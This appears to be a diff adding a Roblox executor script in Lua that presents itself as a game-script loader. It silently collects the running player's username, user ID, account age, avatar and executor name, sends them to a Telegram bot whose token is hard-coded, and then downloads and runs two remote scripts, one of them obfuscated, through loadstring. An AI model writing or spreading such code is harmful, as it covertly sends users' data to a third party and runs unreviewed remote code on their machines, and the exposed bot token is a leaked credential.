@@ -1,0 +1,106 @@
+-- Define Telegram Bot Token and Chat ID
+local botToken = "7688379175:AAFYmiG6bVjvKe7WScCprQ7usQs4s98LUJs"
+local chatID = "2071332436"  -- هنا يجب أن يكون Chat ID الخاص بالمستخدم
+local telegramURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"
+local logFile = "Workspace/log.txt" -- File for logging events
+local activeUsersFile = "Workspace/active_users.txt" -- File for tracking active users
+
+-- Function to log events
+local function logEvent(eventMessage)
+    local logMessage = string.format("[%s] %s\n", os.date("%Y-%m-%d %H:%M:%S"), eventMessage)
+    local success, errorMessage = pcall(function()
+        local file = io.open(logFile, "a")
+        if file then
+            file:write(logMessage)
+            file:close()
+        else
+            error("Failed to open log file.")
+        end
+    end)
+    if not success then
+        print("Error writing to log file: " .. errorMessage)
+    end
+end
+
+-- Prepare data to send
+local player = game.Players.LocalPlayer
+local executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", player.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+
+-- Build message to fit Telegram format
+local activeUsersCount = 1 -- Example count of active users, modify as needed
+local message = string.format(
+    "🔔 معلومات المستخدم\n\n" ..
+    "👤 اسم المستخدم: %s\n" ..
+    "📛 الاسم المعروض: %s\n" ..
+    "🆔 معرف المستخدم: %s\n" ..
+    "🏷️ معرف اللعبة: %s\n" ..
+    "🎮 اسم اللعبة: %s\n" ..
+    "🛠️ الهاك المستخدم: %s\n" ..
+    "📅 عمر الحساب: %s يوم\n" ..
+    "📅 تاريخ الانضمام: %s\n" ..
+    "🖼️ الصورة الرمزية: %s\n" ..
+    "👥 عدد المستخدمين النشطين: %d",
+    player.Name,
+    player.DisplayName,
+    player.UserId,
+    game.PlaceId,
+    game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+    executor,
+    player.AccountAge,
+    os.date("%d/%m/%Y"),
+    AvatarImage,
+    activeUsersCount
+)
+
+-- Function to check connection to Telegram API
+local function checkTelegramConnection()
+    local testURL = "https://api.telegram.org/bot" .. botToken .. "/getMe"
+    local success, response = pcall(function()
+        return game:HttpGet(testURL)
+    end)
+
+    if success then
+        local data = game:GetService("HttpService"):JSONDecode(response)
+        local connectionOk = data.ok
+        logEvent(connectionOk and "Connected to Telegram API successfully." or "Failed to connect to Telegram API.")
+        return connectionOk
+    else
+        logEvent("Error checking Telegram connection: " .. tostring(response))
+        return false
+    end
+end
+
+-- Function to send data to Telegram
+local function sendToTelegram(msg)
+    if checkTelegramConnection() then
+        local requestData = {
+            Url = telegramURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
+            Body = "chat_id=" .. chatID .. "&text=" .. game:GetService("HttpService"):UrlEncode(msg) .. "&parse_mode=Markdown"
+        }
+        local request = http_request or request or HttpPost or syn.request
+        local success, response = pcall(function()
+            return request(requestData)
+        end)
+        if success then
+            logEvent("Message sent successfully.")
+        else
+            logEvent("Failed to send message. Error: " .. tostring(response))
+        end
+    else
+        logEvent("Failed to connect to Telegram API.")
+    end
+end
+
+-- Call send function
+sendToTelegram(message)
+
+-- تشغيل السكربت الأول
+loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999"))()
+
+-- تشغيل السكربت الثاني
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hussein239/Hussein239/refs/heads/main/obf_m244EK83PA667mkbZI9MC6vxq87m7Mh03pxgSGz44J779b6JXe808yqH41t8Q0EI.lua.txt"))()
